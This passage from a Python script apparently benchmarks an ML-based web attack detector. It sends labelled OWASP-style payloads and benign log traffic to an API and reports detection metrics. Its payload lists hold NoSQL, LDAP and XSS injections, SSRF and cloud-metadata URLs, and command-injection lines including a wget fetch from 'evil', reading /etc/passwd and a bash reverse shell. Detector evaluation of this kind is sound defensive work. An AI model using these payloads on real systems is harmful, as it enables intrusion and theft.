        '{"user":{"$ne":null}, "role":{"$gt":1}}',
        "db.users.find({$or:[{admin:true},{role:{$gt:1}}]})",
        "{""""$or"""":[{""""locked"""":{""""$ne"""":true}},{""""login"""":{""""$ne"""":""""user""""}}]}",
        "{""""$and"""":[{""""user"""":{""""$ne"""":null}},{""""pwd"""":{""""$ne"""":null}}]}",
        "db.logs.aggregate([{""""$match"""":{""""$where"""":""""this.ip.startsWith('10.')""""}}])",
        "{""""$where"""":""""this.token && this.token.length>0""""}",
        "{""""$or"""":[{""""$where"""":""""this.isAdmin==true""""},{""""user"""":{""""$regex"""":"""".*""""}}]}",
        "db.auth.find({""""$or"""":[{""""email"""":{""""$ne"""":""""""""}},{""""pwd"""":{""""$ne"""":""""""""}}]})",
        "{""""$where"""":""""sleep(1000) || true""""}",
        "db.system.keys.find({""""$where"""":""""this.key != null""""})",
    ]
    LDAP = [
        "(uid=*)(userPassword=*)",
        "(|(cn=admin)(uid=admin))",
        "(&(objectClass=person)(uid=*))",
        "(|(cn=admin)(cn=root))",
    ]
    CMDI = [
        "; wget http://evil/file",
        "q=1 && cat /etc/passwd",
        "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "Nested command substitution: $(echo $(whoami))",
        "Inject sleep command for timing attack: & sleep 10",
    ]
    XSS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        ">""<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>",
        ">""<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-",
        ">""<a href=""javascript#document.cookie=true;"">",
        ">""<div onmouseover=""document.cookie=true;"">",
    ]
    SSRF = [
        "url=http://127.0.0.1:2375/containers/json",
        "target=http://localhost:8080/admin",
        "src=http://kubernetes.default.svc/metrics",
        "target=http://localhost:8080/admin",
        "callback=http://internal/api",
        "fetch=http://10.1.2.3:9000/private",
        "webhook=http://[::1]/debug",
        "target=http://unix:/var/run/docker.sock",
        "proxy=http://10.0.0.5:8080",
    ]
    API_KEYS = [
        "aws_access_key_id=AKIAABCDEFGHIJKLMNOP",
        "x-api-key=12345-ABCDE-67890-FGHIJ",
        "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc",
    ]
    BRUTE = [
        "login failed for user admin (invalid password)",
        "too many failed logins for user",
        "account locked due to brute force",
        "account locked after 5 failed logins",
        "auth failure for user admin: too many attempts",
        "invalid credentials for admin from 10.0.0.6",
        "brute force detected: 50 failed logins in 5 minutes",
        "login failure count exceeded threshold for account admin",
    ]
    STUFF = [
        "credential stuffing detected for user admin (pwned list)",
        'multiple accounts tried with same password "qwerty" from leaked combos',
        "password reuse suspected for account root from breach dataset",
        "login surge with common password '123456'",
        "leaked credential list observed in authentication logs",
    ]
    IDOR = [
        "/profile?user_id=42 -> changed to user_id=43 returns other user's data",
        "/users/200 returns details for 201 after tampering",
        "/orders?order_id=1001 shows 1002 when parameter tampered",
        "GET /invoice?order_id=5001 returns someone else's invoice",
    ]
    MISCONF = [
        "Index of /public/",
        "X-Powered-By: Express",
        "Traceback (most recent call last):",
        "open CORS detected: Access-Control-Allow-Origin: *",
    ]
    DATAEXP = [
        "-----BEGIN PRIVATE KEY----- MIIC... -----END PRIVATE KEY-----",
        "SSN 123-45-6789 found in response",
        "Authorization: Bearer eyJ...verylongjwttoken...",
        "credit card 5555555555554444 exposed in response",
        "plaintext password field returned by API",
    ]
    DOS = [
        "429 Too Many Requests: rate limit exceeded",
        "slowloris pattern: many open connections",
        "http flood detected from single IP",
        "request timeout during heavy load",
        "connection pool exhaustion by long-lived requests",
        "timeouts spike during traffic flood",
        "DoS detected: excessive requests per second",
        "Slow client holding connections open",
        "Queue backlog increased dramatically",
    ]
    WS = [
        "Sec-WebSocket-Key: abc=",
        "ws://127.0.0.1:8000/socket.io/?EIO=3&transport=websocket",
    ]
    SSRF_META = [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    ]
    BIZ = [
        "apply coupon SAVE10 twice to get double discount",
        "race condition on checkout doubles refund",
        "bypass step validation to skip payment",
    ]

    csv_rows: List[Dict[str, Any]] = []
    scenarios = [
        ("sql_injection", "/payments/charge", "POST", SQLI),
        ("sql_injection", "/api/v1/orders/search", "GET", SQLI),
        ("sql_injection", "/admin/reports/export", "GET", SQLI),
        ("nosql_injection", "/api/v1/users/search", "POST", NOSQL),
        ("nosql_injection", "/api/v2/audit/logs", "POST", NOSQL),
        ("ldap_injection", "/internal/ldap/search", "POST", LDAP),
        ("ldap_injection", "/admin/directory/search", "POST", LDAP),
        ("cmd_injection", "/admin/tools/ping", "POST", CMDI),
        ("cmd_injection", "/admin/diag/traceroute", "POST", CMDI),
        ("xss", "/profile/update", "POST", XSS),
        ("xss", "/comments/post", "POST", XSS),
        ("ssrf", "/fetch-url", "POST", SSRF),
        ("ssrf", "/webhook/test", "POST", SSRF),
        ("ssrf_sensitive", "/metadata/fetch", "POST", SSRF_META),
        ("ssrf_sensitive", "/cloud/proxy", "POST", SSRF_META),
        ("api_key_exposure", "/integrations/slack/callback", "POST", API_KEYS),
        ("api_key_exposure", "/api/v1/keys/rotate", "POST", API_KEYS),
        ("auth_bruteforce", "/auth/login", "POST", BRUTE),
        ("auth_bruteforce", "/api/v1/auth/login", "POST", BRUTE),
        ("credential_stuffing", "/auth/login", "POST", STUFF),
        ("credential_stuffing", "/api/v1/auth/login", "POST", STUFF),
        ("idor", "/profile", "GET", IDOR),
        ("idor", "/admin/users/42", "GET", IDOR),
        ("misconfiguration", "/", "GET", MISCONF),
        ("misconfiguration", "/debug/routes", "GET", MISCONF),
        ("data_exposure", "/files/download", "GET", DATAEXP),
        ("data_exposure", "/reports/export", "GET", DATAEXP),
        ("dos", "/api/v1/search", "GET", DOS),
        ("dos", "/login", "POST", DOS),
        ("websocket", "/ws/chat", "GET", WS),
        ("websocket", "/socket.io/", "GET", WS),
        ("business_logic", "/cart/apply-coupon", "POST", BIZ),
        ("business_logic", "/payments/refund", "POST", BIZ),
    ]

    with requests.Session() as session:
        attack_events = 0
        cycle_idx = 0
        while True:
            if attack_max > 0 and attack_events >= attack_max:
                break
            if attack_max <= 0 and cycle_idx >= loops:
                break

            cycle_idx += 1
            if attack_max > 0:
                say(f"=== Attack cycle {cycle_idx} (sent={attack_events}/{attack_max}) ===")
            elif loops > 1:
                say(f"=== Loop {cycle_idx}/{loops} ===")

            cycle_sent = 0
            for group_name, endpoint, method, payloads in scenarios:
                remaining = None
                if attack_max > 0:
                    remaining = attack_max - attack_events
                    if remaining <= 0:
                        break
                sent_now = run_group(
                    session=session,
                    base_url=base_url,
                    path_process=path_process,
                    detailed=detailed,
                    token=token,
                    pretty=pretty,
                    only_group=only_group,
                    group_name=group_name,
                    endpoint=endpoint,
                    method=method,
                    payloads=payloads,
                    seed=seed,
                    csv_rows=csv_rows,
                    attack_budget=remaining,
                )
                attack_events += sent_now
                cycle_sent += sent_now
                if attack_max > 0 and attack_events >= attack_max:
                    break

            if attack_max > 0 and cycle_sent == 0:
                say("No attack events were sent in this cycle; stopping early.")
                break

        say(f"Attack events generated: {attack_events}")

        # If user provided a path to access.log, load benign traffic
        if benign_log_path:
            # per-loop target based on attacks count (same ratio logic)
            target_per_loop = int(attack_events * benign_multiplier)

            # total target across benign loops (cap by benign_max as "overall cap")
            total_target_benign = min(target_per_loop * benign_loops, benign_max)

            if total_target_benign <= 0:
                say("Benign traffic skipped (total_target_benign <= 0).")
            else:
                say(
                    f"Loading up to {total_target_benign} benign events from {benign_log_path} "
                    f"(multiplier={benign_multiplier}, benign_loops={benign_loops})"
                )

                benign_all = load_benign_from_log(
                    benign_log_path,
                    max_events=total_target_benign,
                )

                if not benign_all:
                    say("No benign events loaded (empty file or parse mismatch).")
                else:
                    # distribute events across benign loops
                    per_loop = [total_target_benign // benign_loops] * benign_loops
                    for i in range(total_target_benign % benign_loops):
                        per_loop[i] += 1

                    def take_events(offset: int, count: int) -> List[Dict[str, Any]]:
                        # if file shorter than needed, cycle
                        out = []
                        n = len(benign_all)
                        for i in range(count):
                            out.append(benign_all[(offset + i) % n])
                        return out

                    offset = 0
                    for b_idx in range(benign_loops):
                        n_send = per_loop[b_idx]
                        if n_send <= 0:
                            continue

                        say(f"Benign loop {b_idx + 1}/{benign_loops}: sending {n_send} benign events...")
                        benign_events = take_events(offset, n_send)
                        offset += n_send

                        run_benign_events(
                            session=session,
                            base_url=base_url,
                            path_process=path_process,
                            detailed=detailed,
                            token=token,
                            pretty=pretty,
                            benign_events=benign_events,
                            csv_rows=csv_rows,
                        )

    total_events = len(csv_rows) if csv_rows is not None else 0
    
    # ---- build overall list of columns ----
    fieldnames_set = {k for row in csv_rows for k in row.keys()}

    base_order = [
        "timestamp",
        "endpoint",
        "method",
        "payload",
        "latency_ms",
        "trace_nonce",
        "source_ip",
        "user_id",
        "hash_id",
        "gt_label",
        "pred_risk",
        "risk_level",
        "final_score",
        "final_threshold",
        "ml_score",
        "nlp_score",
        "topic",
        "topic_score",
        "attack_type_identified",
        "confidence",
        "env",
        "endpoint_class",
        "data_class",
        "auth_state",
        "exposure",
        "blast",
        "status",
        "trace_id",
        "route_ml_models",
        "route_nlp_models",
        "route_fusion_mode",
        "thr_ml",
        "thr_nlp",
        "thr_final",
        "response_raw",
        "human_text",
    ]

    ordered = [f for f in base_order if f in fieldnames_set]
    extra = sorted(fieldnames_set - set(ordered))
    fieldnames = ordered + extra

    group_order = [
        "sql_injection","nosql_injection","ldap_injection","cmd_injection","xss","ssrf","ssrf_sensitive",
        "api_key_exposure","auth_bruteforce","credential_stuffing","idor","misconfiguration","data_exposure",
        "dos","websocket","business_logic","benign",
    ]
    group_labels = {
        "sql_injection": "SQL Injection",
        "nosql_injection": "NoSQL Injection",
        "ldap_injection": "LDAP Injection",
        "cmd_injection": "Command Injection",
        "xss": "Cross-Site Scripting",
        "ssrf": "SSRF",
        "ssrf_sensitive": "SSRF (metadata services)",
        "api_key_exposure": "API key exposure",
        "auth_bruteforce": "Authentication bruteforce",
        "credential_stuffing": "Credential stuffing",
        "idor": "IDOR",
        "misconfiguration": "Misconfiguration",
        "data_exposure": "Data exposure",
        "dos": "DoS",
        "websocket": "WebSocket abuse",
        "business_logic": "Business logic abuse",
        "benign": "Benign",
    }

    # ---- CSV export (if requested) ----
    if csv_out:
        with open(csv_out, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            for row in csv_rows:
                writer.writerow(row)
        print(f"\nCSV written to: {csv_out}")

    # ---- XLSX export (if requested) ----
    if xlsx_out:
        wb = Workbook()
        ws = wb.active
        ws.title = "owasp_runs"

        ws.append(fieldnames)
        for row in csv_rows:
            ws.append([row.get(col) for col in fieldnames])

        # faster auto-fit: sample only first N rows
        sample = csv_rows[:300]
        for idx, col in enumerate(fieldnames, start=1):
            col_letter = get_column_letter(idx)
            vals = [str(r.get(col, "")) for r in sample]
            max_len = max([len(col)] + [len(v) for v in vals]) if vals else len(col)

            if col in ("payload", "response_raw", "human_text"):
                width = min(max_len + 2, 120)
            else:
                width = min(max_len + 2, 60)
            ws.column_dimensions[col_letter].width = width

        # ---- Table 2: Mixed-traffic confusion matrix + metrics (A/B) ----
        t2_hdr, t2_rows = build_table2_mixed_traffic(csv_rows)
        add_table_sheet(
            wb,
            sheet_name="table2_mixed_traffic",
            headers=t2_hdr,
            rows=t2_rows,
            percent_cols={10, 11, 12, 13},
        )

        # ---- Table 3: Risk-level stratification by GT class ----
        t3_hdr, t3_rows = build_table3_risk_stratification(csv_rows, group_order, group_labels)
        add_table_sheet(
            wb,
            sheet_name="table3_risk_stratification",
            headers=t3_hdr,
            rows=t3_rows,
            percent_cols={8},
        )
        add_charts_from_table2(wb)
        add_charts_from_table3(wb, include_benign=False)

        wb.save(xlsx_out)
        print(f"XLSX written to: {xlsx_out}")

    t_end = time.perf_counter()
    elapsed = t_end - t_start

    # ---- console summary: mixed-traffic confusion/metrics ----
    t2_hdr, t2_rows = build_table2_mixed_traffic(csv_rows)
    if t2_rows:
        print("\nTable 2 (mixed traffic):")
        for r in t2_rows:
            print(
                f"- {r[0]} | N={r[2]} attack={r[3]} benign={r[4]} "
                f"TP={r[5]} FP={r[6]} FN={r[7]} TN={r[8]} "
                f"Precision={r[9]:.2f}% Recall={r[10]:.2f}% F1={r[11]:.2f}% FPR={r[12]:.3f}%"
            )

    if total_events > 0:
        events_per_sec = total_events / elapsed
        ms_per_event = (elapsed / total_events) * 1000.0
        print(
            f"\nProcessed {total_events} events in {elapsed:.3f}s "
            f"(~{ms_per_event:.1f} ms/event, {events_per_sec:.1f} events/sec)"
        )

    print("\n\033[1;32mDone.\033[0m")

if __name__ == "__main__":
    main()
